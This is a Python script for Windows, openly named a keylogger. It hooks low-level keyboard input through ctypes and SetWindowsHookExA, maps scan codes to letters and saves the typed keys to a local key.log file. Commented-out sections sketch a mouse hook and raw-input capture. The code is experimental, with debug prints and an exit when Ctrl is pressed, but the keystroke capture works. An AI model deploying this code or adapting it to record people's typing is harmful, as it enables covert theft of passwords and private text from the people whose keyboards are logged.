#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import ctypes
from ctypes.wintypes import MSG

"""
# Mouse movement: https://docs.microsoft.com/en-us/windows/win32/dxtecharts/taking-advantage-of-high-dpi-mouse-movement
HID_USAGE_PAGE_GENERIC = 0x01
HID_USAGE_GENERIC_MOUSE = 0x02

RIDEV_REMOVE        = 0x00000001
RIDEV_EXCLUDE       = 0x00000010
RIDEV_PAGEONLY      = 0x00000020
RIDEV_NOLEGACY      = 0x00000030
RIDEV_INPUTSINK     = 0x00000100
RIDEV_CAPTUREMOUSE  = 0x00000200
RIDEV_NOHOTKEYS     = 0x00000200
RIDEV_APPKEYS       = 0x00000400
RIDEV_EXINPUTSINK   = 0x00001000
RIDEV_DEVNOTIFY     = 0x00002000

WM_INPUT = 0x00FF
"""

# Windows Hook: https://docs.microsoft.com/ko-kr/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14

# https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644986(v=vs.85)?redirectedfrom=MSDN
WM_KEYDOWN = 0x0100

"""
WM_MOUSEMOVE message
:Parameters
    :wParam: indicates whether various virtual keys are down. This parameter can be one or more of the following values.
        MK_CONTROL(0x0008): The CTRL key is down.
        MK_LBUTTON(0x0001): The left mouse button is down.
        MK_MBUTTON(0x0010): The middle mouse button is down.
        MK_RBUTTON(0x0002): The right mouse button is down.
        MK_SHIFT(0x0004):   The SHIFT key is down.
        MK_XBUTTON1(0x0020): The first X button is down.
        MK_XBUTTON2(0x0040): The second X button is down.
    :lParam: The low-order word specifies the x-coordinate of the cursor. The coordinate is relative to the upper-left corner of the client area.
             The high-order word specifies the y-coordinate of the cursor. The coordinate is relative to the upper-left corner of the client area.
"""
WM_MOUSEMOVE = 0x0200

WM_LBUTTONDOWN = 0x0201
WM_RBUTTONDOWN = 0x0204
CTRL_CODE = 29
keys = []

KEY_MAP = {
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
    21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
    35: 'h', 36: 'j', 37: 'k', 38: 'l',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
    49: 'n', 50: 'm'
}


class KeyLogger:
    def __init__(self):
        self.hooked = None

    def install_hook_procedure(self, pointer):
        module_handle = ctypes.windll.kernel32.GetModuleHandleW(None)
        self.hooked = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL,
                                                             pointer,
                                                             module_handle,
                                                             0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_procedure(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def run(self):
        msg = MSG()
        ctypes.windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)


def get_function_pointer(fn):
    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int,
                               ctypes.c_int,
                               ctypes.c_int,
                               ctypes.POINTER(ctypes.c_void_p))
    return CMPFUNC(fn)


def k_hook_procedure(nCode, wParam, lParam):
    print('k_hook_procedure:', wParam)
    if wParam is not WM_KEYDOWN:
        return ctypes.windll.user32.CallNextHookEx(key_logger.hooked,
                                                   nCode,
                                                   wParam,
                                                   lParam)
    lparam = (lParam[0] >> 32)  # and 0xFFFF
    print(bin(lParam[0]), int(lparam))

    if CTRL_CODE == int(lparam):
        print("Ctrl pressed, call uninstallHook()")
        key_logger.uninstall_hook_procedure()
        # mouse_hook.uninstall_hook_procedure()
        sys.exit(-1)

    try:
        hooked_key = KEY_MAP[int(lparam)]
    except KeyError:
        return ctypes.windll.user32.CallNextHookEx(key_logger.hooked,
                                                   nCode,
                                                   wParam,
                                                   lParam)
    keys.append(hooked_key)
    print('k_hook_procedure:', hooked_key)
    save_key_log()
    return ctypes.windll.user32.CallNextHookEx(key_logger.hooked,
                                               nCode,
                                               wParam,
                                               lParam)


def save_key_log():
    path = os.path.join(os.path.dirname(__file__), 'key.log')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(''.join(str(s) for s in keys))


"""Mouse Logger
class MouseHook:

    def __init__(self):
        self.hooked = None

    def install_hook_procedure(self, pointer):
        self.hooked = ctypes.windll.user32.SetWindowsHookExA(WH_MOUSE_LL,
                                                             pointer,
                                                             ctypes.windll.kernel32.GetModuleHandleW(None),
                                                             0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_procedure(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def m_hook_procedure(nCode, wParam, lParam):    # LowLevelMouseProc
    if wParam == WM_LBUTTONDOWN:
        print('m_hook_procedure: LEFT')
    if wParam == WM_RBUTTONDOWN:
        print('m_hook_procedure: RIGHT')
        print('Uninstall hook')
        mouse_hook.uninstall_hook_procedure()
        sys.exit(-1)
    elif wParam != WM_MOUSEMOVE:
    # if (wParam >> 32) != WM_MOUSEMOVE:
        return ctypes.windll.user32.CallNextHookEx(mouse_hook.hooked, nCode, wParam, lParam)
    print('[%s] m_hook_procedure:' % datetime.now().isoformat(), nCode, type(wParam), wParam, type(lParam), lParam)
    try:
        print('lParam.pointer.size:', ctypes.byref(lParam))
        # point = ctypes.cast(lParam, ctypes.POINTER(_Point)).contents
        point = ctypes.cast(lParam, ctypes.POINTER(_MSLLHOOKSTRUCT)).contents
        print('point:', (point.pt.x, point.pt.y))
        print('mouseData:', point.mouseData)
    except Exception as e:
        print('ee', e)
    return ctypes.windll.user32.CallNextHookEx(mouse_hook.hooked, nCode, wParam, lParam)
"""


"""
def register_rawinputdevice():
    rid = RAWINPUTDEVICE()
    rid.usUsagePoge = HID_USAGE_PAGE_GENERIC
    rid.usUsage = HID_USAGE_GENERIC_MOUSE
    rid.dwFlags = RIDEV_NOHOTKEYS   # RIDEV_INPUTSINK
    rid.hwndTarget = None   # ctypes.wintypes.HWND()
    return ctypes.windll.user32.RegisterRawInputDevices(ctypes.pointer(rid), 1, ctypes.sizeof(RAWINPUTDEVICE))


def m_hook_procedure_raw(nCode, wParam, lParam):
    if wParam == WM_INPUT:
        print('m_hook_procedure_raw:', wParam, lParam)
    return ctypes.windll.user32.CallNextHookEx(True, nCode, wParam, lParam)
"""


if __name__ == "__main__":
    key_logger = KeyLogger()
    pointer = get_function_pointer(k_hook_procedure)
    if key_logger.install_hook_procedure(pointer):
        print("installed keyLogger")
    key_logger.run()

    # if not register_rawinputdevice():
    #     print('Failed to register RawInputDevice!')
    #     sys.exit(-1)
    # pointer = get_function_pointer(m_hook_procedure_raw)

    # mouse_hook = MouseHook()
    # pointer = get_function_pointer(m_hook_procedure)
    # if mouse_hook.install_hook_procedure(pointer):
    #     print('installed mouse_hook')
